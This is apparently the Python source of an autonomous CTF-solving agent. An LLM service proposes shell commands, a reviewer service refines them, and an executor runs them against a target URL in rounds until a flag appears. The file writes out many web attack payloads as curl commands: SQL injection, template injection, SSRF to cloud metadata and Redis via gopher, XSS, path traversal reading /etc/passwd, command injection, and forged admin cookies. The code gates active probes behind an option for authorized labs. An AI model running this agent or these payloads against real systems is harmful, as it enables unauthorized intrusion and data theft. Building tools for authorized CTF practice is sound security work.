import base64
import json
import logging
import os
import re
from dataclasses import asdict, dataclass, field

from modules.ctf.ctf_classifier import CTFClassifier, fallback_classification
from modules.ctf.ctf_executor import CTFExecutor
from modules.webscan.web_recon import OUTPUT_LIMIT, build_web_context, run_full_recon
from utils.results import now_iso, save_result_record

logger = logging.getLogger(__name__)

PENTESTGPT_URL = os.environ.get("PENTESTGPT_URL", "http://auto_sec_pentestgpt:8001")
SHANNON_URL = os.environ.get("SHANNON_URL", "http://auto_sec_shannon:8002")
_STATE_BASE64_RE = re.compile(r"[A-Za-z0-9+/]{16,}={0,2}")
_FLAG_RE = re.compile(r"(?:CTF|flag|ctf)\{.+?\}")
_JS_VAR_RE = re.compile(r"(?:const|let|var)\s+(\w+)\s*=\s*[\"']([^\"']+)[\"']")
_URL_RE = re.compile(r"https?://[^\s\"'<>]+")
_STATUS_RE = re.compile(r"\b(100|101|20\d|30\d|40\d|50\d)\b")
_ERROR_KEYWORDS = ["SyntaxError", "mysql_error", "Warning:", "Traceback", "undefined"]


@dataclass
class AgentState:
    base64_candidates: list[str] = field(default_factory=list)
    decoded_results: list[dict] = field(default_factory=list)
    js_variables: dict = field(default_factory=dict)
    endpoints_tried: dict = field(default_factory=dict)
    error_patterns: list[str] = field(default_factory=list)
    cookies: dict = field(default_factory=dict)
    new_urls: list[str] = field(default_factory=list)
    tried_commands: set = field(default_factory=set)
    current_hypothesis: str = "unknown"
    failed_strategies: list[str] = field(default_factory=list)
    # HTTP-aware fields
    http_headers: dict = field(default_factory=dict)
    html_comments: list[str] = field(default_factory=list)
    form_fields: dict = field(default_factory=dict)
    redirect_chain: list[str] = field(default_factory=list)
    challenge_types: list[str] = field(default_factory=list)

    def to_prompt_dict(self) -> dict:
        data = asdict(self)
        data["tried_commands"] = sorted(self.tried_commands)
        return data


# ── Challenge Type Detection ────────────────────────────────────────────────

_CHALLENGE_PATTERNS: dict[str, list[str]] = {
    "header_injection": ["header", "inject", "X-Forwarded", "X-Real-IP", "Referer", "X-Forwarded-Host"],
    "cookie_forgery": ["cookie", "session", "forgery", "flask", "werkzeug", "signed", "role=admin"],
    "ssti": ["template", "jinja", "twig", "erb", "{{", "mako", "SSTI", "smarty"],
    "sqli": ["sql", "database", "mysql", "postgres", "inject", "query", "SELECT", "UNION", "sqlite"],
    "ssrf": ["SSRF", "internal", "metadata", "169.254", "localhost", "gopher", "dict://"],
    "xss": ["XSS", "script", "reflect", "DOM", "alert(", "onerror", "onload"],
    "lfi": ["LFI", "file read", "include", "path traversal", "../", "php://filter", "passwd"],
    "jwt": ["JWT", "jsonwebtoken", "alg", "HS256", "RS256", "bearer", "eyJ"],
    "deserializ": ["deserial", "pickle", "marshal", "PHP unserialize", "yaml.load"],
    "command_inject": ["command", "inject", "shell", "exec", "system(", "passthru", "popen"],
    "base64": ["base64", "编码", "encode", "decode"],
}


def detect_challenge_type(description: str, round1_output: str = "") -> list[str]:
    """Detect challenge types from description and first-round output."""
    text = (description + " " + round1_output).lower()
    detected = []
    for ctype, keywords in _CHALLENGE_PATTERNS.items():
        if any(kw.lower() in text for kw in keywords):
            detected.append(ctype)
    return detected or ["unknown"]


def extract_and_update(output: str, state: AgentState) -> AgentState:
    """Extract structured information from command output and append to state.

    Extracts: base64 candidates, JS vars, URLs, cookies, error patterns,
    HTTP headers, HTML comments, hidden form fields, redirect chains.
    This function is additive — only appends, never clears.
    """
    output = output or ""

    # 1. Base64 candidates
    for candidate in _STATE_BASE64_RE.findall(output):
        if candidate not in state.base64_candidates:
            state.base64_candidates.append(candidate)
            try:
                padded = candidate + ("=" * (-len(candidate) % 4))
                decoded = base64.b64decode(padded).decode("utf-8", errors="ignore")
                if decoded:
                    state.decoded_results.append(
                        {
                            "raw": candidate,
                            "decoded": decoded,
                            "is_flag": bool(_FLAG_RE.search(decoded)),
                        }
                    )
            except Exception:
                pass

    # 2. JS variable assignments
    for name, value in _JS_VAR_RE.findall(output):
        state.js_variables[name] = value

    # 3. URLs and status codes
    status_matches = _STATUS_RE.findall(output)
    inferred_status = int(status_matches[-1]) if status_matches else None
    for url in _URL_RE.findall(output):
        clean_url = url.rstrip(").,;")
        if clean_url not in state.new_urls:
            state.new_urls.append(clean_url)
        if inferred_status is not None:
            state.endpoints_tried[clean_url] = inferred_status

    # 4. Cookies (Set-Cookie and Cookie headers)
    cookie_match = re.findall(r"(?:set-cookie:|cookie:)\s*([^;\r\n=]+)=([^;\r\n]+)", output, re.IGNORECASE)
    for name, value in cookie_match:
        state.cookies[name.strip()] = value.strip()

    # 5. Error patterns
    for keyword in _ERROR_KEYWORDS:
        if keyword in output and keyword not in state.error_patterns:
            state.error_patterns.append(keyword)

    # 6. HTTP response headers (X-*, Server, Content-Type, Location, etc.)
    header_matches = re.findall(
        r'^(X-[\w-]+|Set-Cookie|Location|Server|Content-Type|X-Powered-By|WWW-Authenticate):\s*(.+)',
        output, re.MULTILINE | re.IGNORECASE,
    )
    for name, val in header_matches:
        state.http_headers[name.strip()] = val.strip()

    # 7. HTML comments
    comments = re.findall(r'<!--(.*?)-->', output, re.DOTALL)
    for c in comments:
        stripped = c.strip()
        if stripped and stripped not in state.html_comments:
            state.html_comments.append(stripped)

    # 8. Hidden form fields
    forms = re.findall(r'<input[^>]*type=["\']hidden["\'][^>]*>', output, re.IGNORECASE)
    for f in forms:
        name_m = re.search(r'name=["\']([^"\']+)', f)
        val_m = re.search(r'value=["\']([^"\']+)', f)
        if name_m:
            state.form_fields[name_m.group(1)] = val_m.group(1) if val_m else ""

    # 9. Redirect chains (Location headers)
    redirects = re.findall(r'Location:\s*(\S+)', output, re.IGNORECASE)
    for r in redirects:
        clean = r.strip()
        if clean not in state.redirect_chain:
            state.redirect_chain.append(clean)

    return state


class CTFAgent:
    """ReAct-loop agent that coordinates PentestGPT + Shannon + CTF Executor.

    Three-layer integration:
    - PentestGPT: reasoning with skill knowledge, returns structured commands
    - Shannon: reviews and optimizes PentestGPT's commands
    - Executor: runs commands with auto-fixes (curl -k, base64 decode)
    """

    def __init__(
        self,
        url: str,
        description: str,
        category: str,
        ctf_name: str = "",
        max_rounds: int = 15,
        timeout: int = 300,
        options: dict | None = None,
    ):
        self.url = url
        self.description = description
        self.category = category
        self.ctf_name = ctf_name
        self.max_rounds = max_rounds
        self.timeout = timeout
        self.options = dict(options or {})

        self.executor = CTFExecutor(
            timeout=60,
            category="unknown",
            active_probes=bool(self.options.get("authorized_active_probes")),
        )
        self.classifier = CTFClassifier()
        self.history: list[dict] = []
        self.tried_methods: set[str] = set()
        self.current_hypothesis: str = ""
        self.skills_context: str = ""
        self.web_context: dict = build_web_context(target=url)
        self.classification: dict = fallback_classification()
        self.state = AgentState()
        self.started_at = now_iso()
        self.result_file: str | None = None

    def _load_skills(self):
        """Load CTF skill knowledge base for the challenge category."""
        self.skills_context = self.executor.load_skills(self.category)
        if self.skills_context:
            logger.info("[CTF Agent] Loaded skills for category: %s (%d chars)",
                        self.category, len(self.skills_context))

    def _build_history_for_pentestgpt(self) -> list[dict]:
        """Build structured history list for PentestGPT context.

        Passes full execution output without truncation so PentestGPT
        can see complete command results including HTML source, headers, etc.
        """
        history = []
        for h in self.history[-5:]:
            record = {
                "round": h.get("round", 0),
                "commands": h.get("commands", []),
                "observation": h.get("observation_summary", ""),
                "hypothesis": h.get("hypothesis", ""),
                "flag_found": bool(h.get("flag")),
            }
            history.append(record)
        return history

    def _state_prompt(self, force_new_direction: bool = False) -> str:
        s = self.state
        parts = [
            "=== 目标 ===",
            f"URL: {self.url}",
            f"描述: {self.description}",
            "=== 已知信息（勿重复探测）===",
        ]
        if s.challenge_types and s.challenge_types != ["unknown"]:
            parts.append(f"已识别题型: {s.challenge_types}")
        if s.base64_candidates:
            parts.append(f"Base64候选 ({len(s.base64_candidates)}): {s.base64_candidates[-10:]}")
        if s.decoded_results:
            parts.append(f"解码结果: {s.decoded_results[-10:]}")
        if s.js_variables:
            parts.append(f"JS变量: {s.js_variables}")
        if s.http_headers:
            parts.append(f"HTTP响应头: {s.http_headers}")
        if s.html_comments:
            parts.append(f"HTML注释: {s.html_comments}")
        if s.form_fields:
            parts.append(f"表单字段: {s.form_fields}")
        if s.redirect_chain:
            parts.append(f"重定向链: {s.redirect_chain}")
        if s.cookies:
            parts.append(f"Cookies: {s.cookies}")
        if s.endpoints_tried:
            parts.append(f"已试端点: {s.endpoints_tried}")
        if s.error_patterns:
            parts.append(f"错误模式: {s.error_patterns}")
        if s.failed_strategies:
            parts.append(f"失败策略: {s.failed_strategies}")
        if s.current_hypothesis and s.current_hypothesis != "unknown":
            parts.append(f"当前假设: {s.current_hypothesis}")

        parts.append("=== 本轮目标 ===")
        parts.append("基于已知信息推进，不要重复已失败的命令。")
        if s.base64_candidates:
            parts.append("若发现 base64 候选未解码，exact_commands 必须包含解码命令。")
        if s.js_variables:
            parts.append("若 JS 变量中有疑似密码/token，必须尝试使用。")
        if s.http_headers:
            parts.append("根据响应头信息调整攻击策略。")
        if force_new_direction:
            parts.append("当前策略已穷尽，必须尝试全新方向。")

        return "\n".join(parts)

    def _type_specific_recon(self, challenge_types: list[str]) -> list[str]:
        """Generate challenge-type specific recon commands."""
        cmds = []
        url = self.url

        if "cookie_forgery" in challenge_types or "jwt" in challenge_types:
            cmds.append(f"curl -s -k -v {url} 2>&1 | grep -iE 'set-cookie|jwt|token|session|authorization'")
            cmds.append(f"curl -s -k -b 'admin=true' {url}")
            cmds.append(f"curl -s -k -b 'role=admin' {url}")
            cmds.append(f"curl -s -k -H 'Authorization: Bearer eyJ0ZXN0IjoiYWRtaW4ifQ.signature' {url}")

        if "header_injection" in challenge_types:
            cmds.append(f"curl -s -k -H 'X-Forwarded-For: 127.0.0.1' {url}")
            cmds.append(f"curl -s -k -H 'X-Forwarded-Host: localhost' {url}")
            cmds.append(f"curl -s -k -H 'X-Real-IP: 127.0.0.1' {url}")
            cmds.append(f"curl -s -k -H 'Referer: http://admin.local' {url}")

        if "ssti" in challenge_types:
            cmds.append(f"curl -s -k '{url}?name={{{{7*7}}}}'")
            cmds.append(f"curl -s -k '{url}?input={{{{config}}}}'")
            cmds.append(f"curl -s -k '{url}?page={{{{self.__class__.__mro__[1].__subclasses__()}}}}'")

        if "sqli" in challenge_types:
            cmds.append(f"curl -s -k \"{url}?id=1'\"")
            cmds.append(f"curl -s -k \"{url}?id=1 OR 1=1--\"")
            cmds.append(f"curl -s -k \"{url}?id=1 UNION SELECT 1,2,3--\"")

        if "ssrf" in challenge_types:
            cmds.append(f"curl -s -k '{url}?url=http://127.0.0.1'")
            cmds.append(f"curl -s -k '{url}?url=http://169.254.169.254/latest/meta-data/'")
            cmds.append(f"curl -s -k '{url}?url=gopher://127.0.0.1:6379/_INFO'")

        if "xss" in challenge_types:
            cmds.append(f"curl -s -k '{url}?input=<script>alert(1)</script>'")
            cmds.append(f"curl -s -k '{url}?q=\\\"><img src=x onerror=alert(1)>'")

        if "lfi" in challenge_types:
            cmds.append(f"curl -s -k '{url}?file=../../../etc/passwd'")
            cmds.append(f"curl -s -k '{url}?page=php://filter/convert.base64-encode/resource=index'")
            cmds.append(f"curl -s -k '{url}?include=....//....//....//etc/passwd'")

        if "command_inject" in challenge_types:
            cmds.append(f"curl -s -k '{url}?cmd=id'")
            cmds.append(f"curl -s -k '{url}?host=127.0.0.1;id'")

        if "deserializ" in challenge_types:
            cmds.append(f"curl -s -k '{url}' -v 2>&1 | grep -iE 'pickle|marshal|serialize|java|php'")

        return cmds[:8]

    def _state_flag(self) -> str | None:
        for result in self.state.decoded_results:
            if result.get("is_flag"):
                match = _FLAG_RE.search(str(result.get("decoded", "")))
                return match.group(0) if match else result.get("decoded")
        return None

    def _is_base64_challenge(self) -> bool:
        """Check if this is a base64-themed challenge."""
        desc_lower = self.description.lower()
        return "base64" in desc_lower or "编码" in desc_lower or "encode" in desc_lower

    def _recon_commands(self) -> list[str]:
        """Round 1 fixed recon commands."""
        return [
            f"curl -s -k -L {self.url}",
            f"curl -sI -k -L {self.url}",
            f"curl -s -k -L {self.url}/robots.txt",
            f"curl -s -k -L {self.url}/sitemap.xml",
            f"curl -s -k -L {self.url} | grep -iE 'flag|ctf|secret|token|key|password|admin|hidden|backup|base64'",
        ]

    def _base64_recon_commands(self) -> list[str]:
        """Round 1 recon commands specialized for base64 challenges."""
        decode_script = (
            "import sys,re,base64;"
            "content=sys.stdin.read();"
            "print('=== FULL SOURCE ===');"
            "print(content[:3000]);"
            "strings=re.findall(r'[A-Za-z0-9+/]{20,}={0,2}',content);"
            "print('=== BASE64 CANDIDATES ===');"
            "[print(s+' -> '+base64.b64decode(s+'==').decode('utf-8',errors='ignore')) for s in strings]"
        )
        return [
            f"curl -s -k {self.url} | python3 -c '{decode_script}'",
            f"curl -sI -k {self.url}",
            f"curl -s -k {self.url} | grep -oP '<!--.*?-->'",
        ]

    def _merge_commands(self, primary: list[str], secondary: list[str]) -> list[str]:
        """Merge two command lists, deduplicating and putting primary first."""
        seen = set()
        merged = []
        for cmd in primary:
            normalized = cmd.strip()
            if normalized and normalized not in seen:
                seen.add(normalized)
                merged.append(normalized)
        for cmd in secondary:
            normalized = cmd.strip()
            if normalized and normalized not in seen:
                seen.add(normalized)
                merged.append(normalized)
        return merged

    def _active_probe_commands(self) -> list[str]:
        """Optional active CTF-only probes, disabled by default."""
        if not self.options.get("authorized_active_probes"):
            return []
        return [
            f"curl -s -k -L '{self.url}?id=1%27%20UNION%20SELECT%201--'",
            f"curl -s -k -L '{self.url}?file=../../../../etc/passwd'",
            f"curl -s -k -L '{self.url}?name={{{{7*7}}}}'",
        ]

    def _collect_initial_web_context(self) -> dict:
        """Fetch the challenge landing page once to seed deterministic context."""
        self.web_context = run_full_recon(self.url)
        return self.web_context

    def _classify_web_context(self) -> dict:
        self.classification = self.classifier.classify(self.web_context)
        self.executor.category = self.classification.get("category", "unknown")
        self.executor.active_probes = bool(self.options.get("authorized_active_probes"))
        return self.classification

    def _save_result(self, status: str, flag: str | None = None) -> str:
        warnings = []
        if not self.options.get("authorized_active_probes"):
            warnings.append(
                "Active web payload probes were disabled. "
                "Set options.authorized_active_probes=True for authorized CTF labs."
            )
        result = {
            "category": self.category,
            "ctf_name": self.ctf_name,
            "description": self.description,
            "rounds": self.history,
            "web_context": self.web_context,
            "classification": self.classification,
            "playbook": self.classification.get("playbook", []),
            "state": self.state.to_prompt_dict(),
            "flag": flag,
            "status": status,
            "warnings": warnings,
        }
        self.result_file = save_result_record(
            "ctf",
            target=self.url,
            result=result,
            status="completed" if status in {"flag_found", "not_found"} else status,
            started_at=self.started_at,
            completed_at=now_iso(),
            warnings=warnings,
        )
        return self.result_file

    def _fallback_from_analysis(self, analysis: dict) -> list[str]:
        """Generate commands from PentestGPT analysis when structured commands unavailable."""
        # Try exact_commands first (new format)
        exact = analysis.get("exact_commands", [])
        if exact and isinstance(exact, list):
            return exact[:5]

        cmds = []
        next_steps = analysis.get("next_steps", [])
        attack_ideas = analysis.get("attack_ideas", [])

        # Always try basic page fetch
        cmds.append(f"curl -s -k -L {self.url}")

        # Derive hints from analysis
        hints = []
        for s in next_steps[:3]:
            text = s if isinstance(s, str) else s.get("description", "")
            hints.append(text.lower())
        for idea in attack_ideas[:3]:
            if isinstance(idea, dict):
                hints.append((idea.get("technique", "") + " " + idea.get("description", "")).lower())

        hint_blob = " ".join(hints)
        if "header" in hint_blob or "response" in hint_blob:
            cmds.append(f"curl -sI -k {self.url}")
        if "source" in hint_blob or "comment" in hint_blob or "html" in hint_blob:
            cmds.append(f"curl -s -k {self.url} | grep -iE 'flag|ctf|secret|key|password|admin|hidden'")
        if "base64" in hint_blob or "encode" in hint_blob:
            cmds.append(f"curl -s -k {self.url} | grep -i base64")
        if "cookie" in hint_blob:
            cmds.append(f"curl -sv -k {self.url} 2>&1 | grep -i set-cookie")
        if "redirect" in hint_blob or "302" in hint_blob:
            cmds.append(f"curl -sI -k -L {self.url} | grep -iE 'location|HTTP'")
        if "robots" in hint_blob:
            cmds.append(f"curl -s -k {self.url}/robots.txt")
        if "admin" in hint_blob or "login" in hint_blob:
            cmds.append(f"curl -s -k {self.url}/admin")
            cmds.append(f"curl -s -k {self.url}/login")

        return cmds[:5]

    def _call_pentestgpt(self) -> dict:
        """Call PentestGPT /analyze with skill knowledge and history."""
        history = self._build_history_for_pentestgpt()
        state_prompt = self._state_prompt(bool(self.state.failed_strategies))

        # Build context string
        context_parts = [
            f"CTF Challenge: {self.ctf_name or 'Unknown'}",
            f"Category: {self.category}",
            f"URL/Target: {self.url}",
            f"Description: {self.description}",
            f"Classification: {json.dumps(self.classification, ensure_ascii=False)[:OUTPUT_LIMIT]}",
            state_prompt,
        ]
        if self.current_hypothesis:
            context_parts.append(f"Current Hypothesis: {self.current_hypothesis}")
        if self.tried_methods:
            context_parts.append(f"Already Tried: {'; '.join(sorted(self.tried_methods))}")
        context = "\n".join(context_parts)

        try:
            import httpx as httpx_client

            resp = httpx_client.post(
                f"{PENTESTGPT_URL}/analyze",
                json={
                    "scan_results": {"ctf_context": context},
                    "target": self.url,
                    "context": (
                        "This is a CTF challenge. Stay inside the classified category and playbook. "
                        "Analyze and suggest the next attack approach. Focus on what has NOT been tried yet."
                    ),
                    "skill_content": self.skills_context,
                    "history": history,
                    "output_format": "ctf_structured",
                },
                timeout=120,
            )
            resp.raise_for_status()
            data = resp.json()
            analysis = data.get("analysis", data)
            logger.info("[CTF Agent] PentestGPT raw: %s",
                        json.dumps(data, ensure_ascii=False)[:600])
            return analysis
        except Exception as e:
            logger.warning("[CTF Agent] PentestGPT call failed: %s", e)
            return {"error": str(e)}

    def _call_shannon_review(self, commands: list[str], context: str = "") -> list[str]:
        """Call Shannon /review to optimize PentestGPT's commands."""
        if not commands:
            return commands

        logger.info("[CTF Agent] Shannon review request: %d commands", len(commands))

        try:
            import httpx as httpx_client

            resp = httpx_client.post(
                f"{SHANNON_URL}/review",
                json={
                    "commands": commands,
                    "target": self.url,
                    "category": self.category,
                    "skill_content": self.skills_context,
                    "context": context,
                },
                timeout=120,
            )
            resp.raise_for_status()
            data = resp.json()
            logger.info("[CTF Agent] Shannon review raw: %s",
                        json.dumps(data, ensure_ascii=False)[:600])

            reviewed = data.get("reviewed", data)
            optimized = reviewed.get("commands", [])
            changes = reviewed.get("changes", [])

            if changes:
                logger.info("[CTF Agent] Shannon changes: %s", changes)

            if optimized:
                logger.info("[CTF Agent] Shannon optimized: %s", optimized)
                return optimized

            # Fallback to original commands
            logger.info("[CTF Agent] Shannon returned no commands, using originals")
            return commands
        except Exception as e:
            logger.warning("[CTF Agent] Shannon review failed: %s", e)
            return commands

    def _extract_thought_summary(self, analysis: dict) -> str:
        """Extract a readable summary from PentestGPT analysis."""
        if analysis.get("error"):
            return f"Error: {analysis['error']}"

        # New structured format
        hypothesis = analysis.get("hypothesis", "")
        vuln_type = analysis.get("vulnerability_type", "")
        reasoning = analysis.get("reasoning", "")
        next_action = analysis.get("next_action", "")

        if hypothesis or reasoning:
            parts = []
            if hypothesis:
                parts.append(f"假设: {hypothesis}")
            if vuln_type:
                parts.append(f"漏洞类型: {vuln_type}")
            if next_action:
                parts.append(f"下一步: {next_action}")
            if reasoning:
                parts.append(f"推理: {reasoning}")
            return "\n".join(parts)

        # Legacy format fallback
        summary = analysis.get("summary", "")
        next_steps = analysis.get("next_steps", [])
        findings = analysis.get("findings", [])

        parts = []
        if summary:
            parts.append(summary)
        if findings:
            for f in findings[:3]:
                if isinstance(f, dict):
                    parts.append(f"- {f.get('name', 'Finding')}: {f.get('description', '')}")
                else:
                    parts.append(f"- {f}")
        if next_steps:
            parts.append("Next steps: " + "; ".join(
                s if isinstance(s, str) else s.get("description", str(s))
                for s in next_steps[:3]
            ))
        return "\n".join(parts) if parts else json.dumps(analysis, ensure_ascii=False)[:500]

    def _extract_action_summary(self, commands: list[str], source: str = "") -> str:
        """Extract a readable summary of planned actions."""
        parts = []
        if source:
            parts.append(f"Source: {source}")
        if commands:
            parts.append("Commands:\n" + "\n".join(f"  $ {c}" for c in commands[:10]))
        else:
            parts.append("Commands: (none)")
        return "\n".join(parts)

    def _extract_observation_summary(self, step_results: list[dict]) -> str:
        """Extract full execution results without truncation."""
        parts = []
        for sr in step_results:
            for out in sr.get("outputs", []):
                stdout = out.get("stdout", "").strip()
                stderr = out.get("stderr", "").strip()
                cmd = out.get("command", "")
                rc = out.get("returncode", -1)
                if cmd:
                    parts.append(f"$ {cmd}")
                parts.append(f"[exit code: {rc}]")
                if stdout:
                    parts.append(stdout)
                if stderr:
                    parts.append(f"[stderr] {stderr}")
                if out.get("flag"):
                    parts.append(f"*** FLAG FOUND: {out['flag']} ***")
        return "\n".join(parts) if parts else "No output"

    def _dedup_commands(self, commands: list[str]) -> list[str]:
        """Filter out already-tried commands. Returns only new ones."""
        new_commands = []
        for cmd in commands:
            normalized = cmd.strip()
            if normalized and normalized not in self.state.tried_commands:
                new_commands.append(normalized)
        return new_commands

    def _check_decoded_flags(self) -> str | None:
        """Check all decoded base64 results for flags. Returns first match or None."""
        for result in self.state.decoded_results:
            if result["is_flag"]:
                decoded = result.get("decoded", "")
                match = _FLAG_RE.search(decoded)
                return match.group(0) if match else decoded
        return None

    def solve(self):
        """Generator that yields per-round results for streaming.

        Four-step loop per round:
          Step 1: extract_and_update — parse output into AgentState
          Step 2: base64 decode check — try all candidates, early flag return
          Step 3: PentestGPT with state summary — inject cumulative knowledge
          Step 4: command dedup + execute — filter tried commands, run new ones

        Yields dicts with keys: type, round, thought, action, observation, flag
        """
        self._load_skills()
        reasoning_start_round = 1

        if self.category == "web":
            recon = self._collect_initial_web_context()
            yield {
                "type": "recon",
                "round": 0,
                "thought": "",
                "action": "Full web reconnaissance",
                "observation": json.dumps(recon, ensure_ascii=False, indent=2)[:OUTPUT_LIMIT],
                "flag": None,
                "status": "recon_complete",
                "web_context": recon,
                "result_file": None,
            }
            classification = self._classify_web_context()

            # Detect challenge types from classification
            detected = [classification.get("category", "unknown")]
            for sec in classification.get("secondary_categories", []):
                if sec.get("score", 0) >= 0.2:
                    detected.append(sec["category"])
            self.state.challenge_types = detected

            yield {
                "type": "classification",
                "round": 1,
                "thought": json.dumps(classification, ensure_ascii=False, indent=2),
                "action": "Classify challenge and freeze playbook",
                "observation": "\n".join(classification.get("playbook", [])),
                "flag": None,
                "status": "classified",
                "classification": classification,
                "result_file": None,
            }
            reasoning_start_round = 2

        for round_num in range(reasoning_start_round, self.max_rounds + 1):
            log = []
            log.append(f"{'═' * 50}")
            log.append(f"  Round {round_num} / {self.max_rounds}")
            log.append(f"{'═' * 50}")
            logger.info("[CTF Agent] === Round %d/%d ===", round_num, self.max_rounds)

            # ── Step 1: Extract & update state from previous round ──
            if self.history:
                prev_output = self.history[-1].get("observation_summary", "")
                log.append("")
                log.append("── Step 1: State Extraction ──")
                extract_and_update(prev_output, self.state)

                # Detect challenge types from first round output
                if round_num == reasoning_start_round + 1 and not self.state.challenge_types:
                    self.state.challenge_types = detect_challenge_type(
                        self.description, prev_output
                    )
                    log.append(f"Detected challenge types: {self.state.challenge_types}")

                log.append(f"Base64 candidates: {len(self.state.base64_candidates)}")
                if self.state.http_headers:
                    log.append(f"HTTP headers: {list(self.state.http_headers.keys())}")
                if self.state.html_comments:
                    log.append(f"HTML comments: {len(self.state.html_comments)}")
                if self.state.cookies:
                    log.append(f"Cookies: {list(self.state.cookies.keys())}")

                # ── Step 2: Check decoded base64 for flags ──
                decoded_flag = self._check_decoded_flags()
                if decoded_flag:
                    log.append(f"FLAG FOUND in decoded base64: {decoded_flag}")
                    full_observation = "\n".join(log)
                    result_file = self._save_result("flag_found", decoded_flag)
                    yield {
                        "type": "round", "round": round_num,
                        "thought": "Flag found in decoded base64",
                        "action": "base64 decode",
                        "observation": full_observation,
                        "flag": decoded_flag,
                        "status": "flag_found",
                        "result_file": result_file,
                    }
                    return

            # ── Step 3: PentestGPT with state summary ──
            log.append("")
            log.append("── Step 3: PentestGPT Analysis ──")
            analysis = self._call_pentestgpt()
            thought_summary = self._extract_thought_summary(analysis)
            log.append(thought_summary)

            # ── Step 4: Command Planning ──
            log.append("")
            log.append("── Step 4: Command Planning ──")

            pentestgpt_commands = analysis.get("exact_commands", [])
            if not pentestgpt_commands:
                pentestgpt_commands = self._fallback_from_analysis(analysis)
                source = "Fallback from analysis"
            else:
                source = "PentestGPT exact_commands"

            # First reasoning round: add recon commands
            if round_num == reasoning_start_round:
                if self.category != "web":
                    if self._is_base64_challenge():
                        recon = self._base64_recon_commands()
                        source = "PentestGPT + Base64 Recon"
                    else:
                        recon = self._recon_commands()
                        source = "PentestGPT + Recon"
                    recon = self._merge_commands(recon, self._active_probe_commands())
                    pentestgpt_commands = self._merge_commands(pentestgpt_commands, recon)

                # Add type-specific recon if challenge types detected
                if self.state.challenge_types and self.state.challenge_types != ["unknown"]:
                    type_cmds = self._type_specific_recon(self.state.challenge_types)
                    if type_cmds:
                        pentestgpt_commands = self._merge_commands(pentestgpt_commands, type_cmds)
                        source += " + Type-Specific Recon"
                        log.append(f"Added {len(type_cmds)} type-specific recon commands for: {self.state.challenge_types}")

            log.append(f"Source: {source}")
            log.append(f"PentestGPT generated {len(pentestgpt_commands)} command(s)")

            # Shannon review
            log.append("")
            log.append("── Shannon Review ──")
            context = f"Round {round_num}, category: {self.category}"
            if self.state.challenge_types:
                context += f", types: {self.state.challenge_types}"
            if analysis.get("hypothesis"):
                context += f", hypothesis: {analysis['hypothesis']}"
            reviewed_commands = self._call_shannon_review(pentestgpt_commands, context)

            # ── Step 5: Command dedup + execute ──
            log.append("")
            log.append("── Step 5: Execution ──")
            final_commands = self._dedup_commands(reviewed_commands)

            if not final_commands:
                self.state.failed_strategies.append(
                    analysis.get("hypothesis", self.state.current_hypothesis)
                )
                log.append("All commands already tried — strategy exhausted")
                self.state.current_hypothesis = "策略已穷尽，必须尝试全新方向"
                full_observation = "\n".join(log)
                self.history.append({
                    "round": round_num,
                    "thought": thought_summary,
                    "action": "",
                    "observation": full_observation,
                    "observation_summary": "All commands already tried",
                    "commands": [],
                    "hypothesis": self.state.current_hypothesis,
                    "flag": None,
                })
                yield {
                    "type": "round", "round": round_num,
                    "thought": thought_summary,
                    "action": "",
                    "observation": full_observation,
                    "flag": None,
                    "status": "continuing",
                    "result_file": None,
                }
                continue

            # Register commands as tried
            self.state.tried_commands.update(final_commands)

            action_summary = self._extract_action_summary(final_commands, source)
            log.append(f"Final commands after dedup: {len(final_commands)}")
            log.append(action_summary)

            # Execute
            steps = [{"step_id": "ctf-step", "action": source, "commands": final_commands}]
            step_results = self.executor.execute_steps(steps)
            observation_summary = self._extract_observation_summary(step_results)

            exec_count = sum(len(sr.get("outputs", [])) for sr in step_results)
            log.append(f"Executed {exec_count} command(s):")
            log.append(observation_summary)

            # Extract state from execution output
            for sr in step_results:
                for out in sr.get("outputs", []):
                    stdout = out.get("stdout", "")
                    stderr = out.get("stderr", "")
                    extract_and_update(stdout + "\n" + stderr, self.state)

            # Check decoded flags
            decoded_flag = self._check_decoded_flags()
            if decoded_flag:
                log.append(f"FLAG FOUND in decoded base64: {decoded_flag}")

            # ── Flag check from execution ──
            exec_flag = None
            for sr in step_results:
                if sr.get("flag"):
                    exec_flag = sr["flag"]
                    break

            flag = exec_flag or decoded_flag

            if flag:
                log.append(f"FLAG FOUND: {flag}")
            else:
                log.append("No flag in command output")

            # Update hypothesis
            if not flag and observation_summary != "No output":
                self.state.current_hypothesis = (
                    f"Round {round_num}: "
                    f"{analysis.get('hypothesis', '')}. "
                    f"Results: {observation_summary[:500]}. "
                    f"Need to try different approaches."
                )

            full_observation = "\n".join(log)

            self.history.append({
                "round": round_num,
                "thought": thought_summary,
                "action": action_summary,
                "observation": full_observation,
                "observation_summary": observation_summary,
                "commands": final_commands,
                "hypothesis": analysis.get("hypothesis", self.state.current_hypothesis),
                "flag": flag,
            })

            result_file = self._save_result("flag_found", flag) if flag else None
            yield {
                "type": "round", "round": round_num,
                "thought": thought_summary,
                "action": action_summary,
                "observation": full_observation,
                "flag": flag,
                "status": "flag_found" if flag else "continuing",
                "result_file": result_file,
            }

            if flag:
                return

        # Exhausted all rounds
        self._save_result("not_found", None)
        yield {
            "type": "final",
            "round": self.max_rounds,
            "thought": "", "action": "", "observation": "",
            "flag": None,
            "status": "max_rounds_reached",
            "message": f"Reached maximum rounds ({self.max_rounds}) without finding flag.",
            "result_file": self.result_file,
        }
